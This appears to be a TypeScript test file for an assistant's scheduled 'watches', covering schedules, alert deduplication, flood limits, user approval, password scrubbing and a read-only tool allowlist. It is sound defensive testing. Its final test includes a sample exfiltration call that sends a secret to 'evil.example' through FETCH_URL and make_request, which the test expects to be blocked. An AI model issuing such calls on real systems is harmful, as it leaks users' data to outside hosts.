import { test } from 'node:test'
import assert from 'node:assert/strict'
import { openDb } from './db.ts'
import { Reminders } from './reminders.ts'
import { Watches, watchTools, watchKit, type Alert } from './watches.ts'

function setup(reply: (instruction: string) => Alert[] | Promise<Alert[]>) {
  const db = openDb(':memory:')
  let now = new Date('2026-10-23T10:00:00Z')
  const clock = (): Date => now
  const reminders = new Reminders(db, clock)
  const seen: string[] = []
  const watches = new Watches(db, reminders, async (instruction) => { seen.push(instruction); return reply(instruction) }, clock)
  return { reminders, watches, seen, tick: (min: number) => { now = new Date(now.getTime() + min * 60_000) } }
}

test('a watch checks on its own schedule, and each thing it finds is told once', async () => {
  const s = setup(() => [{ key: 'mail-1', message: 'Asha emailed about the Atlas contract.' }])
  s.watches.add('Tell me when Asha emails me', 10)
  await s.watches.checkDue()
  await s.watches.checkDue()
  assert.equal(s.seen.length, 1, 'not again before 10 minutes')
  s.tick(10)
  await s.watches.checkDue()
  assert.equal(s.seen.length, 2)
  assert.deepEqual(s.reminders.list().map((r) => [r.text, r.dueAt]), [['Asha emailed about the Atlas contract.', '2026-10-23T10:00:00.000Z']])
})

test('an alert can be timed, like a heads-up before a meeting; a moved meeting loses its old one', async () => {
  let start = '2026-10-23T10:25:00Z'
  const s = setup(() => [{ key: `standup@${start}`, message: 'Standup in 5 minutes.', at: start }])
  s.watches.add('Remind me 5 minutes before each meeting', 10)
  await s.watches.checkDue()
  assert.deepEqual(s.reminders.list().map((r) => r.dueAt), ['2026-10-23T10:25:00.000Z'])
  start = '2026-10-23T10:45:00Z'
  s.tick(10)
  await s.watches.checkDue()
  assert.deepEqual(s.reminders.list().map((r) => r.dueAt), ['2026-10-23T10:45:00.000Z'])
})

test('a failed check changes nothing, bad alerts are dropped, and one check cannot flood', async () => {
  const s = setup(() => { throw new Error('connector down') })
  s.watches.add('anything', 10)
  await s.watches.checkDue()
  assert.equal(s.reminders.list().length, 0)
  const many = setup(() => [{ key: '', message: 'x' }, { key: 'a', message: '' }, ...Array.from({ length: 30 }, (_, i) => ({ key: `k${i}`, message: 'y'.repeat(900) }))])
  many.watches.add('anything', 10)
  await many.watches.checkDue()
  const list = many.reminders.list()
  assert.equal(list.length, 10)
  assert.ok(list.every((r) => r.text.length <= 300))
})

test('setting up a watch needs the user\'s yes; listing and stopping do not', async () => {
  const s = setup(() => [])
  const asked: string[] = []
  const no = watchTools(s.watches, async (a) => { asked.push(a); return false })
  assert.match(await no.run('watch', { what: 'Tell me when Linear assigns me an issue', every_minutes: 15 }), /said no/)
  assert.match(asked[0], /Linear assigns me an issue/)
  assert.equal(s.watches.list().length, 0)
  const scrubbed = watchTools(s.watches, async (a) => { asked.push(a); return true }, (t) => t.replace('hunter2', '[hidden]'))
  await scrubbed.run('watch', { what: 'Log in with hunter2 and tell me when the build fails' })
  assert.ok(!asked.at(-1)!.includes('hunter2') && !s.watches.list()[0].instruction.includes('hunter2'), 'login details never reach the approval or the store')
  s.watches.remove(s.watches.list()[0].id)
  const yes = watchTools(s.watches, async () => true)
  assert.match(await yes.run('watch', { what: 'Tell me when Linear assigns me an issue', every_minutes: 15 }), /every 15 minutes/)
  const [w] = s.watches.list()
  assert.match(await yes.run('watches', {}), /Linear/)
  await yes.run('stop_watch', { id: w.id })
  assert.equal(s.watches.list().length, 0)
})

test('a watch reads on its own, so it never gets a tool that reaches the web or changes anything', async () => {
  const ran: string[] = []
  const kit = watchKit({
    definitions: ['GMAIL_FETCH_EMAILS', 'LINEAR_LIST_ISSUES', 'FETCH_URL', 'WEB_SEARCH', 'COMPOSIO_SEARCH_TOOLS', 'COMPOSIO_MULTI_EXECUTE_TOOL',
      'SLACK_SEND_MESSAGE', 'make_request', 'GITHUB_GET_WEBHOOK', 'TAVILY_SEARCH', 'COMPOSIO_SEARCH_DUCK_DUCK_GO', 'EXA_SEARCH', 'SERPAPI_SEARCH'].map((name) => ({ name })),
    run: async (name) => { ran.push(name); return 'ok' },
  })
  assert.deepEqual(kit.definitions.map((d) => (d as { name: string }).name), ['GMAIL_FETCH_EMAILS', 'LINEAR_LIST_ISSUES', 'COMPOSIO_SEARCH_TOOLS', 'COMPOSIO_MULTI_EXECUTE_TOOL'])
  await assert.rejects(kit.run('FETCH_URL', { url: 'https://evil.example/?d=secret' }), /not available/)
  await assert.rejects(kit.run('make_request', { url: 'https://evil.example' }), /not available/, 'a tool whose name does not say it reads is out')
  await assert.rejects(kit.run('COMPOSIO_MULTI_EXECUTE_TOOL', { tools: [{ tool_slug: 'COMPOSIO_FETCH_URL' }] }), /not available/)
  await assert.rejects(kit.run('COMPOSIO_MULTI_EXECUTE_TOOL', { tools: [{ tool_slug: 'GMAIL_FETCH_EMAILS' }, { tool_slug: 'SLACK_SEND_MESSAGE' }] }), /not available/)
  await assert.rejects(kit.run('COMPOSIO_MULTI_EXECUTE_TOOL', {}), /not available/)
  await kit.run('GMAIL_FETCH_EMAILS', {})
  await kit.run('COMPOSIO_MULTI_EXECUTE_TOOL', { tools: [{ tool_slug: 'LINEAR_LIST_ISSUES' }] })
  assert.deepEqual(ran, ['GMAIL_FETCH_EMAILS', 'COMPOSIO_MULTI_EXECUTE_TOOL'])
})
